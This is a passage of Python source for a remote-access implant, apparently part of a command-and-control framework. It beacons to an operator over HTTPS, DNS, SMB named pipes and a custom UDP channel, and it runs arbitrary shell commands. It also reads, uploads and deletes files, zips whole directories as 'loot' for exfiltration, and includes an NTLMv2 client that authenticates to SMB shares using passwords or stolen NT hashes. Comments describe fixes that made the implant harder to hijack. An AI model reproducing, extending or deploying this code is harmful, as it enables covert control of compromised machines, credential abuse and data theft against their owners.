            return True
        return False

    def _beacon_https(self) -> Optional[dict]:
        info = self._system_info()
        info["action"] = "beacon"
        return self._https_post("beacon", info)

    def _send_result_https(self, task_id: str, status: str, output: str,
                           data: Optional[dict] = None):
        result = {
            "action": "result",
            "agent_id": self._agent_id or self._implant_id,
            "task_id": task_id,
            "status": status,
            "output": output,
        }
        if data:
            result["data"] = data
        self._https_post("result", result)

    # ── DNS transport ──

    def _beacon_dns(self) -> Optional[dict]:
        try:
            agent = self._agent_id or self._implant_id
            encoded_id = base64.b32encode(agent.encode()).decode().rstrip("=").lower()
            query = f"{encoded_id}.b.{self.dns_domain}"

            results = _dns_query(query, "TXT", self.dns_resolver, timeout=10)
            for txt in results:
                try:
                    return self._decrypt(txt)
                except Exception:
                    # This used to fall back to json.loads(b64decode(txt)),
                    # so anyone able to answer the TXT query could task the
                    # implant without the key. A record that does not decrypt
                    # is not tasking; try the next one.
                    continue
        except Exception as e:
            logger.debug("DNS beacon failed: %s", e)
        return None

    # ── SMB named-pipe transport ──

    def _smb_connect(self) -> Optional[socket.socket]:
        """Connect to SMB server and open a named pipe for C2 comms."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(15)
            host = self.smb_server
            port = 445
            if ":" in host:
                host, port = host.rsplit(":", 1)
                port = int(port)
            sock.connect((host, port))

            # SMB2 Negotiate
            neg = self._smb2_negotiate_request()
            sock.sendall(self._smb_netbios_wrap(neg))
            resp = self._smb_recv(sock)
            if not resp or resp[12:14] != b"\x00\x00":
                sock.close()
                return None

            # SMB2 Session Setup (anonymous/null)
            sess = self._smb2_session_setup()
            sock.sendall(self._smb_netbios_wrap(sess))
            resp = self._smb_recv(sock)
            if not resp:
                sock.close()
                return None
            self._smb_session_id = resp[44:52]

            # SMB2 Tree Connect to IPC$
            tree = self._smb2_tree_connect_request(host)
            sock.sendall(self._smb_netbios_wrap(tree))
            resp = self._smb_recv(sock)
            if not resp:
                sock.close()
                return None
            self._smb_tree_id = resp[40:44]

            # SMB2 Create (open named pipe)
            create = self._smb2_create_pipe(self.smb_pipe_name)
            sock.sendall(self._smb_netbios_wrap(create))
            resp = self._smb_recv(sock)
            if not resp or len(resp) < 84:
                sock.close()
                return None
            self._smb_file_id = resp[132:148]

            return sock
        except Exception as e:
            logger.debug("SMB connect failed: %s", e)
            return None

    def _smb_netbios_wrap(self, data: bytes) -> bytes:
        return b"\x00" + struct.pack(">I", len(data))[1:] + data

    def _smb_recv(self, sock: socket.socket) -> Optional[bytes]:
        try:
            hdr = b""
            while len(hdr) < 4:
                chunk = sock.recv(4 - len(hdr))
                if not chunk:
                    return None
                hdr += chunk
            length = struct.unpack(">I", b"\x00" + hdr[1:4])[0]
            data = b""
            while len(data) < length:
                chunk = sock.recv(min(length - len(data), 65536))
                if not chunk:
                    return None
                data += chunk
            return data
        except Exception:
            return None

    def _smb2_negotiate_request(self) -> bytes:
        # The `_request` suffix is not decoration. This method and
        # `_smb2_tree_connect_request` below used to be called
        # `_smb2_negotiate` and `_smb2_tree_connect`, which are also the
        # names of the smbloot helpers further down this class -- and those
        # come later, so they won. `_smb_connect` called them with the
        # wrong arguments, raised TypeError on its first real statement,
        # caught it, logged at debug level and returned None: the SMB C2
        # transport could never connect, and said nothing about it. A test
        # now walks the project for any name bound twice in one scope.
        hdr = b"\xfeSMB"
        hdr += struct.pack("<H", 64)         # StructureSize
        hdr += struct.pack("<H", 0)          # CreditCharge
        hdr += struct.pack("<I", 0)          # Status
        hdr += struct.pack("<H", 0)          # Command: NEGOTIATE
        hdr += struct.pack("<H", 1)          # CreditRequest
        hdr += struct.pack("<I", 0)          # Flags
        hdr += struct.pack("<I", 0)          # NextCommand
        hdr += struct.pack("<Q", 1)          # MessageId
        hdr += struct.pack("<I", 0)          # Reserved
        hdr += struct.pack("<I", 0)          # TreeId
        hdr += struct.pack("<Q", 0)          # SessionId
        hdr += b"\x00" * 16                  # Signature
        # Negotiate body
        body = struct.pack("<H", 36)         # StructureSize
        body += struct.pack("<H", 2)         # DialectCount
        body += struct.pack("<H", 1)         # SecurityMode
        body += struct.pack("<H", 0)         # Reserved
        body += struct.pack("<I", 0)         # Capabilities
        body += b"\x00" * 16                 # ClientGuid
        body += struct.pack("<I", 0)         # NegotiateContextOffset
        body += struct.pack("<H", 0)         # NegotiateContextCount
        body += struct.pack("<H", 0)         # Reserved2
        body += struct.pack("<H", 0x0202)    # Dialect SMB 2.0.2
        body += struct.pack("<H", 0x0210)    # Dialect SMB 2.1
        return hdr + body

    def _smb2_session_setup(self) -> bytes:
        hdr = self._smb2_header(1, 0)       # Command: SESSION_SETUP
        # NTLMSSP Negotiate (Type 1) — anonymous
        ntlm = b"NTLMSSP\x00"
        ntlm += struct.pack("<I", 1)        # Type 1
        ntlm += struct.pack("<I", 0xe2088297)  # Flags
        ntlm += b"\x00" * 16                # DomainNameFields + WorkstationFields
        body = struct.pack("<H", 25)         # StructureSize
        body += struct.pack("<B", 0)         # Flags
        body += struct.pack("<B", 1)         # SecurityMode
        body += struct.pack("<I", 0)         # Capabilities
        body += struct.pack("<I", 0)         # Channel
        body += struct.pack("<H", 88)        # SecurityBufferOffset
        body += struct.pack("<H", len(ntlm)) # SecurityBufferLength
        body += struct.pack("<Q", 0)         # PreviousSessionId
        body += ntlm
        return hdr + body

    def _smb2_tree_connect_request(self, host: str) -> bytes:
        hdr = self._smb2_header(3, 0)       # Command: TREE_CONNECT
        path = f"\\\\{host}\\IPC$".encode("utf-16-le")
        body = struct.pack("<H", 9)          # StructureSize
        body += struct.pack("<H", 0)         # Reserved
        body += struct.pack("<H", 72)        # PathOffset (from start of header)
        body += struct.pack("<H", len(path)) # PathLength
        body += path
        return hdr + body

    def _smb2_create_pipe(self, pipe_name: str) -> bytes:
        hdr = self._smb2_header(5, 0)       # Command: CREATE
        name = pipe_name.encode("utf-16-le")
        body = struct.pack("<H", 57)         # StructureSize
        body += struct.pack("<B", 0)         # SecurityFlags
        body += struct.pack("<B", 2)         # RequestedOplockLevel
        body += struct.pack("<I", 0)         # ImpersonationLevel
        body += struct.pack("<Q", 0)         # SmbCreateFlags
        body += struct.pack("<Q", 0)         # Reserved
        body += struct.pack("<I", 0x001f01ff)  # DesiredAccess: GENERIC_ALL
        body += struct.pack("<I", 7)         # FileAttributes
        body += struct.pack("<I", 7)         # ShareAccess: READ|WRITE|DELETE
        body += struct.pack("<I", 1)         # CreateDisposition: FILE_OPEN
        body += struct.pack("<I", 0)         # CreateOptions
        body += struct.pack("<H", 120)       # NameOffset
        body += struct.pack("<H", len(name)) # NameLength
        body += struct.pack("<I", 0)         # CreateContextsOffset
        body += struct.pack("<I", 0)         # CreateContextsLength
        body += name
        return hdr + body

    def _smb2_header(self, command: int, tree_id_val: int) -> bytes:
        hdr = b"\xfeSMB"
        hdr += struct.pack("<H", 64)
        hdr += struct.pack("<H", 0)          # CreditCharge
        hdr += struct.pack("<I", 0)          # Status
        hdr += struct.pack("<H", command)
        hdr += struct.pack("<H", 1)          # CreditRequest
        hdr += struct.pack("<I", 0)          # Flags
        hdr += struct.pack("<I", 0)          # NextCommand
        hdr += struct.pack("<Q", 2)          # MessageId
        hdr += struct.pack("<I", 0)          # Reserved
        hdr += getattr(self, "_smb_tree_id", struct.pack("<I", tree_id_val))
        hdr += getattr(self, "_smb_session_id", struct.pack("<Q", 0))
        hdr += b"\x00" * 16                  # Signature
        return hdr

    def _smb_write_pipe(self, sock: socket.socket, data: bytes) -> bool:
        try:
            hdr = self._smb2_header(9, 0)    # Command: WRITE
            body = struct.pack("<H", 49)     # StructureSize
            body += struct.pack("<H", 70)    # DataOffset
            body += struct.pack("<I", len(data))  # Length
            body += struct.pack("<Q", 0)     # Offset
            body += self._smb_file_id        # FileId (16 bytes)
            body += struct.pack("<I", 0)     # Channel
            body += struct.pack("<I", 0)     # RemainingBytes
            body += struct.pack("<H", 0)     # WriteChannelInfoOffset
            body += struct.pack("<H", 0)     # WriteChannelInfoLength
            body += struct.pack("<I", 0)     # Flags
            body += data
            sock.sendall(self._smb_netbios_wrap(hdr + body))
            resp = self._smb_recv(sock)
            return resp is not None
        except Exception:
            return False

    def _smb_read_pipe(self, sock: socket.socket) -> Optional[bytes]:
        try:
            hdr = self._smb2_header(8, 0)    # Command: READ
            body = struct.pack("<H", 49)     # StructureSize
            body += struct.pack("<B", 0)     # Padding
            body += struct.pack("<B", 0)     # Flags
            body += struct.pack("<I", 65536) # Length
            body += struct.pack("<Q", 0)     # Offset
            body += self._smb_file_id        # FileId (16 bytes)
            body += struct.pack("<I", 1)     # MinimumCount
            body += struct.pack("<I", 0)     # Channel
            body += struct.pack("<I", 0)     # RemainingBytes
            body += struct.pack("<H", 0)     # ReadChannelInfoOffset
            body += struct.pack("<H", 0)     # ReadChannelInfoLength
            body += b"\x00"                  # Buffer
            sock.sendall(self._smb_netbios_wrap(hdr + body))
            resp = self._smb_recv(sock)
            if not resp or len(resp) < 84:
                return None
            data_offset = struct.unpack_from("<H", resp, 66)[0] - 64
            data_length = struct.unpack_from("<I", resp, 68)[0]
            return resp[64 + data_offset:64 + data_offset + data_length]
        except Exception:
            return None

    def _beacon_smb(self) -> Optional[dict]:
        """Exchange C2 data over SMB named pipe."""
        sock = self._smb_connect()
        if not sock:
            return None
        try:
            # No decoy envelope here. _wrap_payload exists to make an HTTP
            # request body look like ordinary API traffic; a named pipe
            # write carries raw bytes with no JSON body for an inspector to
            # read, so the envelope would add length and buy nothing -- and
            # the listener would have to unwrap it again.
            #
            # _system_info() carries both "id" (the implant id, always set)
            # and "agent_id" (None until the server assigns one), so it is
            # the only thing that needs to go in. There used to be an
            # explicit "agent_id": self._agent_id or self._implant_id above
            # the spread, which the spread then overwrote on every call --
            # dead, and misleading about what identifies a beacon on first
            # contact. _beacon_https builds its payload the same way.
            payload = self._encrypt(dict(self._system_info(),
                                         action="beacon" if self._registered
                                         else "register"))
            if not self._smb_write_pipe(sock, payload.encode()):
                return None
            resp_data = self._smb_read_pipe(sock)
            if not resp_data:
                return None
            try:
                return self._decrypt(resp_data.decode() if isinstance(resp_data, bytes) else resp_data)
            except Exception:
                # This used to fall back to json.loads(resp_data), accepting
                # unencrypted tasking from anything on the pipe. A response
                # that does not decrypt is a failed exchange.
                return None
        except Exception as e:
            logger.debug("SMB beacon failed: %s", e)
            return None
        finally:
            try:
                sock.close()
            except Exception:
                pass

    def _send_result_smb(self, task_id: str, status: str, output: str,
                         data: Optional[dict] = None):
        sock = self._smb_connect()
        if not sock:
            return
        try:
            result = {
                "action": "result",
                "agent_id": self._agent_id or self._implant_id,
                "task_id": task_id,
                "status": status,
                "output": output,
            }
            if data:
                result["data"] = data
            # Same reasoning as the check-in above: no envelope on a pipe.
            payload = self._encrypt(result)
            self._smb_write_pipe(sock, payload.encode())
            self._smb_read_pipe(sock)
        except Exception as e:
            logger.debug("SMB result send failed: %s", e)
        finally:
            try:
                sock.close()
            except Exception:
                pass

    # ── QUIC (UDP) transport ──

    def _quic_send(self, data: dict) -> Optional[dict]:
        """Lightweight QUIC-like C2 channel over UDP with TLS-style framing."""
        try:
            host = self.quic_server
            port = 4433
            if ":" in host:
                host, port = host.rsplit(":", 1)
                port = int(port)

            # No envelope on a datagram either: there is no HTTP body to
            # disguise, and the frame header below already describes the
            # length the receiver needs.
            payload = self._encrypt(data).encode()

            # Frame: [4-byte length][payload]
            frame = struct.pack(">I", len(payload)) + payload

            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(10)

            # Fragment into 1200-byte QUIC-style datagrams
            frag_size = 1200
            total_frags = (len(frame) + frag_size - 1) // frag_size
            stream_id = struct.unpack(">I", os.urandom(4))[0]

            for i in range(total_frags):
                chunk = frame[i * frag_size:(i + 1) * frag_size]
                # Header: [stream_id(4)][frag_index(2)][total_frags(2)][chunk]
                dgram = struct.pack(">IHH", stream_id, i, total_frags) + chunk
                sock.sendto(dgram, (host, port))

            # Receive reassembled response
            fragments: dict = {}
            expected = None
            while True:
                try:
                    resp_data, _ = sock.recvfrom(1500)
                    if len(resp_data) < 8:
                        continue
                    r_stream, r_idx, r_total = struct.unpack(">IHH", resp_data[:8])
                    expected = r_total
                    fragments[r_idx] = resp_data[8:]
                    if len(fragments) == expected:
                        break
                except socket.timeout:
                    break

            sock.close()

            if not fragments or (expected and len(fragments) < expected):
                return None

            reassembled = b""
            for i in sorted(fragments.keys()):
                reassembled += fragments[i]

            resp_len = struct.unpack(">I", reassembled[:4])[0]
            resp_payload = reassembled[4:4 + resp_len]

            try:
                return self._decrypt(resp_payload.decode())
            except Exception:
                # This used to fall back to json.loads(resp_payload),
                # accepting unencrypted tasking from any UDP sender that
                # answered. A response that does not decrypt is a failed
                # exchange.
                return None
        except Exception as e:
            logger.debug("QUIC beacon failed: %s", e)
            return None

    def _beacon_quic(self) -> Optional[dict]:
        # Same shape as _beacon_smb and _beacon_https: _system_info()
        # already carries "id" and "agent_id", and an explicit agent_id
        # above the spread was dead code.
        return self._quic_send(dict(self._system_info(),
                                    action="beacon" if self._registered
                                    else "register"))

    def _send_result_quic(self, task_id: str, status: str, output: str,
                          data: Optional[dict] = None):
        result = {
            "action": "result",
            "agent_id": self._agent_id or self._implant_id,
            "task_id": task_id,
            "status": status,
            "output": output,
        }
        if data:
            result["data"] = data
        self._quic_send(result)

    # ── Command execution (pure Python for file ops, subprocess only for shell) ──

    def _exec_shell(self, cmd: str, timeout: int = 300) -> str:
        try:
            r = subprocess.run(
                cmd, shell=True,
                capture_output=True, text=True,
                timeout=timeout,
            )
            output = r.stdout
            if r.stderr:
                output += f"\n[stderr]\n{r.stderr}"
            if r.returncode != 0:
                output += f"\n[exit {r.returncode}]"
            return output[:65536]
        except subprocess.TimeoutExpired:
            return f"[timeout after {timeout}s]"
        except Exception as e:
            return f"[error: {e}]"

    def _exec_ls(self, path: str = ".") -> str:
        try:
            p = Path(path)
            if not p.exists():
                return f"ls: {path}: No such file or directory"
            lines = []
            for entry in sorted(p.iterdir()):
                try:
                    st = entry.stat()
                    mode = stat.filemode(st.st_mode)
                    size = st.st_size
                    mtime = time.strftime("%Y-%m-%d %H:%M", time.localtime(st.st_mtime))
                    lines.append(f"{mode} {size:>10} {mtime} {entry.name}")
                except OSError:
                    lines.append(f"?????????? ? {entry.name}")
            return "\n".join(lines) if lines else "(empty)"
        except Exception as e:
            return f"[error: {e}]"

    def _exec_lsjson(self, path: str = ".") -> str:
        try:
            p = Path(path)
            if not p.exists():
                return json.dumps({"error": f"{path}: No such file or directory"})
            entries = []
            for entry in sorted(p.iterdir()):
                try:
                    st = entry.stat()
                    info = {
                        "name": entry.name,
                        "path": str(entry.resolve()),
                        "is_dir": entry.is_dir(),
                        "is_link": entry.is_symlink(),
                        "size": st.st_size,
                        "mode": stat.filemode(st.st_mode),
                        "mtime": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(st.st_mtime)),
                        "atime": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(st.st_atime)),
                        "ctime": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(st.st_ctime)),
                    }
                    if entry.is_symlink():
                        try:
                            info["link_target"] = str(entry.resolve())
                        except Exception:
                            info["link_target"] = "?"
                    ext = entry.suffix.lower()
                    if entry.is_dir():
                        info["type"] = "directory"
                    elif ext in (".py", ".js", ".ts", ".sh", ".bash", ".ps1", ".rb", ".go",
                                 ".c", ".h", ".cpp", ".rs", ".java", ".cs", ".php", ".pl"):
                        info["type"] = "code"
                    elif ext in (".txt", ".md", ".rst", ".log", ".csv", ".json", ".xml",
                                 ".yaml", ".yml", ".toml", ".ini", ".cfg", ".conf"):
                        info["type"] = "text"
                    elif ext in (".jpg", ".jpeg", ".png", ".gif", ".bmp", ".svg", ".ico"):
                        info["type"] = "image"
                    elif ext in (".zip", ".tar", ".gz", ".bz2", ".xz", ".7z", ".rar"):
                        info["type"] = "archive"
                    elif ext in (".exe", ".dll", ".so", ".dylib", ".elf", ".bin"):
                        info["type"] = "binary"
                    elif ext in (".key", ".pem", ".crt", ".cer", ".p12", ".pfx", ".jks"):
                        info["type"] = "cert"
                    elif ext in (".db", ".sqlite", ".sqlite3", ".mdb"):
                        info["type"] = "database"
                    else:
                        info["type"] = "file"
                    try:
                        if platform.system() != "Windows":
                            import pwd
                            import grp
                            info["owner"] = pwd.getpwuid(st.st_uid).pw_name
                            info["group"] = grp.getgrgid(st.st_gid).gr_name
                        else:
                            info["owner"] = ""
                            info["group"] = ""
                    except Exception:
                        info["owner"] = str(st.st_uid) if hasattr(st, "st_uid") else ""
                        info["group"] = str(st.st_gid) if hasattr(st, "st_gid") else ""
                    entries.append(info)
                except OSError:
                    entries.append({"name": entry.name, "error": True})
            return json.dumps({"path": str(p.resolve()), "entries": entries,
                               "count": len(entries)})
        except Exception as e:
            return json.dumps({"error": str(e)})

    def _exec_cat(self, path: str) -> str:
        try:
            return Path(path).read_text(errors="replace")[:65536]
        except Exception as e:
            return f"[error: {e}]"

    def _exec_download(self, path: str) -> dict:
        try:
            data = Path(path).read_bytes()
            if len(data) > 10 * 1024 * 1024:
                return {"error": f"File too large ({len(data)} bytes, max 10MB)"}
            return {
                "filename": Path(path).name,
                "size": len(data),
                "data": base64.b64encode(data).decode(),
            }
        except Exception as e:
            return {"error": str(e)}

    def _exec_loot(self, path: str) -> dict:
        """Zip a directory recursively and return as downloadable data."""
        try:
            p = Path(path)
            if not p.exists():
                return {"error": f"{path}: No such file or directory"}
            if p.is_file():
                return self._exec_download(path)
            buf = io.BytesIO()
            file_count = 0
            max_size = 50 * 1024 * 1024
            with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED, compresslevel=6) as zf:
                for root, dirs, files in os.walk(str(p)):
                    for fn in files:
                        fp = Path(root) / fn
                        try:
                            arcname = str(fp.relative_to(p))
                            if fp.stat().st_size > max_size:
                                continue
                            zf.write(str(fp), arcname)
                            file_count += 1
                        except (PermissionError, OSError):
                            continue
                        if buf.tell() > max_size:
                            break
                    if buf.tell() > max_size:
                        break
            data = buf.getvalue()
            dirname = p.name or "root"
            filename = f"{dirname}.zip"
            return {
                "filename": filename,
                "size": len(data),
                "files": file_count,
                "data": base64.b64encode(data).decode(),
                "loot": True,
            }
        except Exception as e:
            return {"error": str(e)}

    def _exec_upload(self, path: str, data_b64: str) -> str:
        try:
            target = Path(path)
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_bytes(base64.b64decode(data_b64))
            return f"Uploaded {target} ({target.stat().st_size} bytes)"
        except Exception as e:
            return f"[error: {e}]"

    @staticmethod
    def _exec_pwd() -> str:
        return os.getcwd()

    @staticmethod
    def _exec_cd(path: str) -> str:
        try:
            os.chdir(path)
            return os.getcwd()
        except Exception as e:
            return f"[error: {e}]"

    @staticmethod
    def _exec_cp(src: str, dst: str) -> str:
        try:
            if Path(src).is_dir():
                shutil.copytree(src, dst)
            else:
                shutil.copy2(src, dst)
            return f"Copied {src} -> {dst}"
        except Exception as e:
            return f"[error: {e}]"

    @staticmethod
    def _exec_mv(src: str, dst: str) -> str:
        try:
            shutil.move(src, dst)
            return f"Moved {src} -> {dst}"
        except Exception as e:
            return f"[error: {e}]"

    @staticmethod
    def _exec_rm(path: str) -> str:
        try:
            p = Path(path)
            if p.is_dir():
                shutil.rmtree(path)
            else:
                p.unlink()
            return f"Removed {path}"
        except Exception as e:
            return f"[error: {e}]"

    @staticmethod
    def _exec_mkdir(path: str) -> str:
        try:
            Path(path).mkdir(parents=True, exist_ok=True)
            return f"Created {path}"
        except Exception as e:
            return f"[error: {e}]"

    @staticmethod
    def _exec_chmod(mode: str, path: str) -> str:
        try:
            os.chmod(path, int(mode, 8))
            return f"chmod {mode} {path}"
        except Exception as e:
            return f"[error: {e}]"

    @staticmethod
    def _exec_write(path: str, content: str) -> str:
        try:
            target = Path(path)
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_text(content)
            return f"Wrote {len(content)} bytes to {path}"
        except Exception as e:
            return f"[error: {e}]"

    # ── SMBLoot (pure-Python SMB2 client, no impacket) ──

    def _smb2_negotiate(self, sock: socket.socket) -> bytes:
        """SMB2 Negotiate → returns server GUID + security blob."""
        neg = bytearray(36)
        struct.pack_into("<H", neg, 0, 36)       # StructureSize
        struct.pack_into("<H", neg, 2, 2)        # DialectCount
        struct.pack_into("<H", neg, 4, 1)        # SecurityMode (signing enabled)
        struct.pack_into("<H", neg, 6, 0)        # Reserved
        struct.pack_into("<I", neg, 8, 0)        # Capabilities
        neg += b"\x00" * 16                      # ClientGuid
        neg += struct.pack("<I", 0)              # NegotiateContextOffset
        neg += struct.pack("<H", 0)              # NegotiateContextCount
        neg += struct.pack("<H", 0)              # Reserved2
        neg += struct.pack("<H", 0x0202)         # Dialect SMB 2.0.2
        neg += struct.pack("<H", 0x0210)         # Dialect SMB 2.1
        self._smb2_send(sock, 0x0000, 0, 0, bytes(neg))
        return self._smb2_recv(sock)

    def _smb2_send(self, sock: socket.socket, command: int,
                   msg_id: int, tree_id: int, payload: bytes,
                   session_id: int = 0, flags: int = 0):
        """Send an SMB2 packet with NetBIOS framing."""
        hdr = bytearray(64)
        hdr[0:4] = b"\xfeSMB"
        struct.pack_into("<H", hdr, 4, 64)       # StructureSize
        struct.pack_into("<H", hdr, 6, 0)        # CreditCharge
        struct.pack_into("<I", hdr, 8, 0)        # Status
        struct.pack_into("<H", hdr, 12, command)
        struct.pack_into("<H", hdr, 14, 1)       # CreditRequest
        struct.pack_into("<I", hdr, 16, flags)
        struct.pack_into("<I", hdr, 20, 0)       # NextCommand
        struct.pack_into("<Q", hdr, 24, msg_id)
        struct.pack_into("<I", hdr, 36, tree_id)
        struct.pack_into("<Q", hdr, 40, session_id)
        hdr[48:64] = b"\x00" * 16               # Signature
        pkt = bytes(hdr) + payload
        nb = struct.pack(">I", len(pkt))
        sock.sendall(nb + pkt)

    def _smb2_recv(self, sock: socket.socket) -> bytes:
        """Receive an SMB2 response, return full packet (header + body)."""
        nb_hdr = self._recv_exact(sock, 4)
        length = struct.unpack(">I", nb_hdr)[0]
        return self._recv_exact(sock, length)

    @staticmethod
    def _recv_exact(sock: socket.socket, n: int) -> bytes:
        buf = bytearray()
        while len(buf) < n:
            chunk = sock.recv(n - len(buf))
            if not chunk:
                raise ConnectionError("SMB connection closed")
            buf.extend(chunk)
        return bytes(buf)

    def _ntlmv2_hash(self, password: str, username: str, domain: str) -> bytes:
        """Compute NTLMv2 hash (NT hash → HMAC-MD5 with user+domain)."""
        import hmac as _hmac
        nt_hash = hashlib.new("md4", password.encode("utf-16-le")).digest()
        identity = (username.upper() + domain.upper()).encode("utf-16-le")
        return _hmac.new(nt_hash, identity, hashlib.md5).digest()

    def _ntlm_auth(self, sock: socket.socket, username: str, password: str,
                   domain: str, nt_hash: bytes = None) -> tuple:
        """NTLM authentication over SMB2 SessionSetup. Returns (session_id, session_key)."""
        import hmac as _hmac

        # Type 1 (Negotiate)
        neg_flags = 0xe2088217
        type1 = b"NTLMSSP\x00" + struct.pack("<I", 1)
        type1 += struct.pack("<I", neg_flags)
        type1 += struct.pack("<HHI", 0, 0, 0)  # DomainNameFields
        type1 += struct.pack("<HHI", 0, 0, 0)  # WorkstationFields

        # Wrap in GSS-API / SPNEGO
        blob1 = self._gss_wrap_ntlm(type1, is_init=True)

        # SessionSetup request
        setup = bytearray(24)
        struct.pack_into("<H", setup, 0, 25)    # StructureSize
        struct.pack_into("<B", setup, 2, 0)     # Flags
        struct.pack_into("<B", setup, 3, 1)     # SecurityMode
        struct.pack_into("<I", setup, 4, 0)     # Capabilities
        struct.pack_into("<I", setup, 8, 0)     # Channel
        struct.pack_into("<H", setup, 12, 88)   # SecurityBufferOffset (64 hdr + 24 body)
        struct.pack_into("<H", setup, 14, len(blob1))
        struct.pack_into("<Q", setup, 16, 0)    # PreviousSessionId
        self._smb2_send(sock, 0x0001, 1, 0, bytes(setup) + blob1)
        resp1 = self._smb2_recv(sock)

        status = struct.unpack_from("<I", resp1, 8)[0]
        session_id = struct.unpack_from("<Q", resp1, 40)[0]

        if status != 0xc0000016:  # STATUS_MORE_PROCESSING_REQUIRED
            raise PermissionError(f"NTLM negotiate failed: 0x{status:08x}")

        # Extract Type 2 (Challenge) from response
        sec_offset = struct.unpack_from("<H", resp1, 64 + 4)[0]
        sec_length = struct.unpack_from("<H", resp1, 64 + 6)[0]
        sec_blob = resp1[sec_offset:sec_offset + sec_length]
        type2 = self._gss_unwrap_ntlm(sec_blob)

        # Parse Type 2
        server_challenge = type2[24:32]
        target_info_len = struct.unpack_from("<H", type2, 40)[0]
        target_info_off = struct.unpack_from("<I", type2, 44)[0]
        target_info = type2[target_info_off:target_info_off + target_info_len]

        # Compute NTLMv2 response
        if nt_hash:
            response_key = _hmac.new(nt_hash,
                                     (username.upper() + domain.upper()).encode("utf-16-le"),
                                     hashlib.md5).digest()
        else:
            nt_h = hashlib.new("md4", password.encode("utf-16-le")).digest()
            response_key = _hmac.new(nt_h,
                                     (username.upper() + domain.upper()).encode("utf-16-le"),
                                     hashlib.md5).digest()

        client_challenge = os.urandom(8)
        timestamp = struct.pack("<Q", int((time.time() + 11644473600) * 10000000))
        blob = b"\x01\x01\x00\x00\x00\x00\x00\x00"
        blob += timestamp
        blob += client_challenge
        blob += b"\x00\x00\x00\x00"
        blob += target_info
        blob += b"\x00\x00\x00\x00"

        nt_proof = _hmac.new(response_key, server_challenge + blob, hashlib.md5).digest()
        nt_response = nt_proof + blob
        session_key = _hmac.new(response_key, nt_proof, hashlib.md5).digest()

        # Build Type 3 (Authenticate)
        domain_enc = domain.encode("utf-16-le")
        user_enc = username.encode("utf-16-le")
        ws_enc = platform.node().encode("utf-16-le")

        off = 88
        type3 = b"NTLMSSP\x00" + struct.pack("<I", 3)
        # LmChallengeResponse (24 bytes of zeros)
        lm_resp = b"\x00" * 24
        type3 += struct.pack("<HHI", len(lm_resp), len(lm_resp), off)
        off += len(lm_resp)
        type3 += struct.pack("<HHI", len(nt_response), len(nt_response), off)
        off += len(nt_response)
        type3 += struct.pack("<HHI", len(domain_enc), len(domain_enc), off)
        off += len(domain_enc)
        type3 += struct.pack("<HHI", len(user_enc), len(user_enc), off)
        off += len(user_enc)
        type3 += struct.pack("<HHI", len(ws_enc), len(ws_enc), off)
        off += len(ws_enc)
        type3 += struct.pack("<HHI", 0, 0, off)  # EncryptedRandomSession
        type3 += struct.pack("<I", neg_flags)
        type3 += b"\x00" * (88 - len(type3))  # Pad to offset
        type3 += lm_resp + nt_response + domain_enc + user_enc + ws_enc

        blob3 = self._gss_wrap_ntlm(type3, is_init=False)

        setup2 = bytearray(24)
        struct.pack_into("<H", setup2, 0, 25)
        struct.pack_into("<B", setup2, 2, 0)
        struct.pack_into("<B", setup2, 3, 1)
        struct.pack_into("<I", setup2, 4, 0)
        struct.pack_into("<I", setup2, 8, 0)
        struct.pack_into("<H", setup2, 12, 88)
        struct.pack_into("<H", setup2, 14, len(blob3))
        struct.pack_into("<Q", setup2, 16, 0)
        self._smb2_send(sock, 0x0001, 2, 0, bytes(setup2) + blob3, session_id=session_id)
        resp2 = self._smb2_recv(sock)

        status2 = struct.unpack_from("<I", resp2, 8)[0]
        if status2 != 0:
            raise PermissionError(f"NTLM auth failed: 0x{status2:08x}")

        return session_id, session_key

    @staticmethod
    def _gss_wrap_ntlm(ntlm_bytes: bytes, is_init: bool) -> bytes:
        """Minimal SPNEGO wrapper for NTLM tokens."""
        ntlm_oid = b"\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a"  # 1.3.6.1.4.1.311.2.2.10
        spnego_oid = b"\x2b\x06\x01\x05\x05\x02"  # 1.2.840.113554.1.2.2

        def _asn1_len(length: int) -> bytes:
            if length < 0x80:
                return struct.pack("B", length)
            elif length < 0x100:
                return b"\x81" + struct.pack("B", length)
            else:
                return b"\x82" + struct.pack(">H", length)

        if is_init:
            # mechToken [2]
            mech_token = b"\xa2" + _asn1_len(len(ntlm_bytes) + 2) + \
                         b"\x04" + _asn1_len(len(ntlm_bytes)) + ntlm_bytes
            # mechTypes [0]
            mech_type = b"\x06" + _asn1_len(len(ntlm_oid)) + ntlm_oid
            mech_list = b"\x30" + _asn1_len(len(mech_type)) + mech_type
            mech_types = b"\xa0" + _asn1_len(len(mech_list)) + mech_list
            # negTokenInit SEQUENCE
            inner = mech_types + mech_token
            neg_init = b"\xa0" + _asn1_len(len(inner)) + inner
            neg_seq = b"\x30" + _asn1_len(len(neg_init)) + neg_init
            # Application [0] with SPNEGO OID
            oid_enc = b"\x06" + _asn1_len(len(spnego_oid)) + spnego_oid
            app_inner = oid_enc + neg_seq
            return b"\x60" + _asn1_len(len(app_inner)) + app_inner
        else:
            # negTokenResp: responseToken [2]
            resp_token = b"\xa2" + _asn1_len(len(ntlm_bytes) + 2) + \
                         b"\x04" + _asn1_len(len(ntlm_bytes)) + ntlm_bytes
            inner = resp_token
            return b"\xa1" + _asn1_len(len(inner) + 2) + \
                   b"\x30" + _asn1_len(len(inner)) + inner

    @staticmethod
    def _gss_unwrap_ntlm(blob: bytes) -> bytes:
        """Extract NTLM message from SPNEGO response blob."""
        # Search for NTLMSSP signature
        idx = blob.find(b"NTLMSSP\x00")
        if idx >= 0:
            return blob[idx:]
        raise ValueError("NTLMSSP not found in security blob")

    def _smb2_tree_connect(self, sock: socket.socket, session_id: int,
                           msg_id: int, share_path: str) -> tuple:
        """TreeConnect to \\\\server\\share. Returns (tree_id, next_msg_id)."""
        path_enc = share_path.encode("utf-16-le")
        tc = bytearray(8)
        struct.pack_into("<H", tc, 0, 9)     # StructureSize
        struct.pack_into("<H", tc, 2, 0)     # Reserved
